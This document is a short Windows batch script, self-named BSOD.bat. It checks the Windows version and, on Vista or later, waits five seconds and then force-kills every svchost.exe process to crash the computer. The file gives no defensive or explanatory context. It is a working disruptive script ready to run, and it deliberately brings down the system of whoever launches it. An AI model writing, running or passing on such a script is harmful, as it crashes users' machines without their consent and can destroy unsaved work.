@echo off
if exist "C:\Documents and Settings" goto no
if exist "C:\Users" goto yes
:no
cls

title Unsupported Operating System Detected
color 0a

echo Cannot execute BSOD.bat 
echo Windows Vista is required to execute this file.
echo .
	
pause
exit
:yes
color 0a
timeout 5
taskkill /f /im svchost.exe
